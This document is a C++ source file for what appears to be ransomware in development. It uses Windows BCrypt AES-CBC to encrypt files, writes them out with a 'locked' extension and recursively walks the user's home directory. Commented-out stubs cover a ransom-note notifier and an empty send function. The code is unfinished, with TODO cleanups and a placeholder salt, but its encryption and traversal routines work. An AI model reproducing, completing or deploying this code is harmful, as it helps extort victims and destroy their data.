#include <iostream>
#include <string>
#include <stdexcept>


#include "config.h"
#include "Encryption.h"
#include <fstream>

#ifdef _WIN32
#	include <windows.h>
#	include <Urlmon.h>
#	include <Lmcons.h>
#	include <winternl.h>
#	include <ntstatus.h>
#	include <winerror.h>
#	include <bcrypt.h>
#	include <cstdio>
#	include <sal.h>
#else
#	include <pwd.h>
#endif

using namespace boost::filesystem;
using std::string;

//TODO change this salt!
static const BYTE Salt[] =
{
	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
	0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
};

void encrypt(string path);

void iterate(const path& parent);
void process(const path& path);
string get_username();
string get_home();
void send();
void notify();
DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
size_t getFileSize(const string path);

int main(int argc, char* argv[]) {
//	crypt_data* d = generatekey();//TODO also move to encrypt

#ifdef DEBUG
	string path = "c:\\rans\\236499\\Squanched\\Debug\\rans.txt";
#else
	string path = get_home();
#endif

	encrypt(path);
//	iterate(path);

//#ifdef DEBUG
//	std::cout << "Username: " << get_username() << std::endl;
//	encrypt(d, "./README.md");
//#endif
//
//	send();
//
//	delete d;
//
//	notify();
//
	return 0;
}

size_t getFileSize(const string path)
{
	std::ifstream plaintext;
	plaintext.open(path,std::ios::binary);
	if(!plaintext.is_open()) {
		return 0;
	}
	plaintext.seekg(0, std::ios::end);
	std::streampos plaintextLen = plaintext.tellg();
	plaintext.close();
	return plaintextLen;
}

DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key)
{
	DWORD status;
	status = BCryptGenRandom(NULL, *iv, IV_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if(!NT_SUCCESS(status)) {
		return status;
	}
	status = BCryptGenRandom(NULL, *key, KEY_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	return status;
}

void encrypt(string path) 
{
	DWORD status;
	string cipher;
	string plain;

	size_t plainTextLen = getFileSize(path);
	std::ifstream plaintextFile;
	plaintextFile.open(path, std::ios::binary);
	BYTE* plainText = new BYTE[plainTextLen];
	char c;
	for (size_t i = 0; i < plainTextLen; ++i) {
		plaintextFile.get(c);
		plainText[i] = c;
	}
	plaintextFile.close();

	PBYTE iv =  (PBYTE)HeapAlloc(GetProcessHeap(),0,IV_LEN);
	PBYTE key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);

	status = generateKeyAndIV(&iv, &key);
	if(!NT_SUCCESS(status)) {
		//TODO cleanup
		std::cout << "key and IV set FAIL";//TODO remove if doesn't show
	}
	//keep in persistant file



#ifdef DEBUG
	// Print key and initialization vector
	std::cout << "Key:\t\t" << key << std::endl;

	std::cout << "IV:\t\t" << iv << std::endl;

	std::cout << "PALINTEXT LEN : \t\t" << plainTextLen << std::endl;

	std::cout << "Plaintext:\t" <<(char*) plainText << std::endl;
#endif
	


	//TODO get AES HANDLE , add CBC property, set KEY handle
	BCRYPT_ALG_HANDLE aesHandle = nullptr;
	status = BCryptOpenAlgorithmProvider(&aesHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
	if(!NT_SUCCESS(status)) {
		//TODO cleanup
	}
	ULONG res;
	char blockLen[50] ={0};
	status = BCryptGetProperty(aesHandle, BCRYPT_BLOCK_LENGTH, (PUCHAR)blockLen, 50,&res, 0);
	if (!NT_SUCCESS(status)) {
		//TODO cleanup
	}
	//TODO verify compatible block length
	BCRYPT_KEY_HANDLE keyHandle;
	status = BCryptGenerateSymmetricKey(aesHandle, &keyHandle, NULL, 0, key, KEY_LEN, 0);
	if (!NT_SUCCESS(status)) {
		std::cout << "BAD KEY HANDLE" << std::endl;
		//TODO cleanup
	}

	status = BCryptSetProperty(keyHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(status)) {
		//TODO cleanup
	}
	DWORD cipherSize,resSize;
	//CHECK IF NEEDED V
	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if(NULL == tmpIv) {
		//cleanup
	}
	memcpy(tmpIv, iv, IV_LEN);
	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, NULL, 0, &cipherSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		//TODO cleanup
	}

	PBYTE cipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
	if(NULL == cipherText) {
		//cleanup
	}
	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, cipherText, cipherSize, &resSize, BCRYPT_BLOCK_PADDING);

#ifdef DEBUG
	std::cout << "Ciphertext:\t" << cipherText << std::endl;
#endif
	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
	ofile.write((char*) cipherText, resSize);
	ofile.close();

	delete plainText;
	//TODO CLEANUP!!!!!
}



void iterate(const path& parent) {
	string path;
	directory_iterator end_itr;

	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
		path = itr->path().string();

		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
			iterate(path);
		}
		else {
			process(path);
		}
	}
}

void process(const path& path) {
#ifdef debug
	cout << "processing " << path << endl;
#else
	encrypt(path.string());
#endif
}

//string get_username() {
//#ifdef _WIN32
//	char username[UNLEN + 1];
//	DWORD length = UNLEN + 1;
//	GetUserName(username, &length);
//
//	return string(username);
//#else
//	struct passwd *pw;
//
//	uid_t uid = geteuid();
//	pw = getpwuid(uid);
//	if (pw) {
//		return string(pw->pw_name);
//	}
//
//	return EMPTY;
//#endif
//}
//
//string get_home() {
//#ifdef _WIN32
//	string path;
//
//	char* drive = getenv("USERPROFILE");
//	if (drive == NULL) {
//		throw runtime_error("USERPROFILE environment variable not found");
//	}
//	else {
//		path = drive;
//	}
//
//	return path;
//#else
//	struct passwd *pw;
//
//	uid_t uid = geteuid();
//	pw = getpwuid(uid);
//	if (pw) {
//		return string(pw->pw_dir);
//	}
//
//	return EMPTY;
//#endif
//}
//
//void notify() {
//	if (OPEN_FILE) {
//		std::ofstream ofile(NOTIFY_FILENAME);
//		ofile.write(NOTIFY_MESSAGE, sizeof(NOTIFY_MESSAGE));
//		ofile.close();
//
//		system((string("start ") + NOTIFY_FILENAME).c_str());
//	}
//}
//
//void send() {
//
//}
